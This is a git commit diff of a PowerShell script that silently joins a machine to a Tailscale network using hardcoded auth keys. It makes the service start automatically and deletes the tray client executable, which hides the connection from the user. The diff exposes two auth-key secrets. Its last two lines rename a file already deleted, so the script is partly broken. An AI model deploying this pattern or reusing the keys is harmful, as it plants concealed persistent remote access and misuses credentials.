63500814ae28b065f0700c56b8d132dd29a77773
Muhammad Zain <134594267+zainmustafam977@users.noreply.github.com>
2025-05-29 22:50:54 +0500

    sc.ps1

--- data/sc.ps1
+++ data/sc.ps1
@@ -10,8 +10,10 @@ Start-Process -FilePath "$env:TEMP\tailscale-setup.exe" -ArgumentList "/quiet" -
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
 #Start-Process -FilePath "tailscale.exe" -ArgumentList "up --authkey tskey-auth-kDmVZv8Wr411CNTRL-W38EWMdmKoHAVMvJFC19oHPH2Ra4X1Yvb" -NoNewWindow -Wait
 
-tailscale up --auth-key=tskey-auth-kDmVZv8Wr411CNTRL-W38EWMdmKoHAVMvJFC19oHPH2Ra4X1Yvb --unattended 
+
+tailscale up --auth-key=tskey-auth-kcKbHhQ2kA21CNTRL-WDsKUos161Wv18XG4Sr71WER2PWAwrcVA --unattended
 tailscale up
+Get-Service Tailscale | Set-Service -StartupType Automatic
 Remove-Item -Path "C:\Program Files\Tailscale\tailscale-ipn.exe" -Force
 Rename-Item -Path "C:\Program Files\Tailscale\tailscale-ipn.exe" -NewName "tailscale-ipn.disabled"
 
